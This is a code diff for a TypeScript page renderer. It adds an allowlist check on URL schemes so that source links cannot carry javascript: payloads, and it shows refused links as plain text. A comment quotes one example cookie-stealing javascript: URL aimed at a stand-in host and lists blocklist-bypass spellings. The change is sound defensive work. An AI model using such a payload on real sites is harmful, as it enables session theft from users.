@@ -47,6 +47,34 @@ function esc(s: string): string {
     .replace(/"/g, '&quot;').replace(/'/g, '&#39;');
 }
 
+/**
+ * The escaped href for a caller-supplied URL, or `null` when its SCHEME is not one we will link.
+ *
+ * esc() stops a value breaking OUT of the attribute; it says nothing about what the attribute then
+ * means. `javascript:fetch("https://evil/"+document.cookie)` survives escaping intact and becomes a
+ * working link — and this page is served from the apex, where the session cookie lives, from a link
+ * the platform actively tells people to click inside somebody else's app. Escaping and scheme are
+ * two different jobs, and this is the second one.
+ *
+ * ALLOWLIST, NEVER A BLOCKLIST. No stripping of "javascript:" and keeping the rest: that is a
+ * rewrite-the-attacker's-string game, and it is lost by `java\tscript:`, `JaVaScRiPt:`, a leading
+ * newline, or the next encoding nobody thought of. Two schemes are permitted and everything else —
+ * including `data:` and anything relative that could resolve oddly — is simply not a link.
+ *
+ * The caller renders a refusal as TEXT rather than dropping it: see the call site. A page that
+ * quietly hides part of what a record says fails the same way as one that renders it dangerously.
+ */
+export function safeHref(url: unknown): string | null {
+  if (typeof url !== 'string') return null;
+  const raw = url.trim();
+  // canParse rather than try/catch: an unparseable address is an ANSWER here ("not a link"), not a
+  // failure to swallow, and saying so without a catch keeps that distinction visible.
+  if (!URL.canParse(raw)) return null;
+  const parsed = new URL(raw);
+  if (parsed.protocol !== 'http:' && parsed.protocol !== 'https:') return null;
+  return esc(parsed.href);
+}
+
 /** Localized copy. Only the CHROME lives here; every statement of fact comes off the record. */
 const COPY = {
   en: {
@@ -116,6 +144,8 @@ code{font-family:ui-monospace,SFMono-Regular,Menlo,monospace;font-size:.9em}
 ol{margin:.3rem 0 0;padding-left:1.2rem}
 li{margin-bottom:.3rem;overflow-wrap:anywhere}
 a{color:var(--accent)}
+.badhref{font-family:ui-monospace,SFMono-Regular,Menlo,monospace;font-size:.85em;color:var(--dim);
+ word-break:break-all}
 .note{color:var(--dim);font-size:.9rem;margin:.6rem 0 0}
 .actions{display:flex;flex-wrap:wrap;gap:.75rem;margin-top:.75rem}
 @media (max-width:32rem){dl{grid-template-columns:1fr;gap:.15rem}dt{margin-top:.5rem}}
@@ -209,7 +239,16 @@ ${row(t.stampedBy, stamped ? esc(stamped) : '')}
 
 ${sources.length ? `<h2>${esc(t.sources)}</h2>
 <div class="card"><ol>
-${sources.map(s => `<li><a href="${esc(s.url)}" rel="noopener noreferrer nofollow" target="_blank">${esc(s.title || s.url)}</a>${s.retrievedAt ? ` <span class="note">(${esc(String(s.retrievedAt).slice(0, 10))})</span>` : ''}</li>`).join('\n')}
+${sources.map(s => {
+  const href = safeHref(s.url);
+  const when = s.retrievedAt ? ` <span class="note">(${esc(String(s.retrievedAt).slice(0, 10))})</span>` : '';
+  // A scheme we will not link is shown VERBATIM as text — the reader sees exactly what the record
+  // declared, and can judge it, which is the whole point of publishing the record. The address is
+  // shown rather than the title here on purpose: a title is the attacker's string too, and behind a
+  // dead link it would be the only thing on screen.
+  if (!href) return `<li><span class="badhref">${esc(s.url)}</span>${when}</li>`;
+  return `<li><a href="${href}" rel="noopener noreferrer nofollow" target="_blank">${esc(s.title || s.url)}</a>${when}</li>`;
+}).join('\n')}
 </ol></div>` : ''}
 
 ${record.attestation?.contentHash ? `<h2>${esc(t.hash)}</h2>
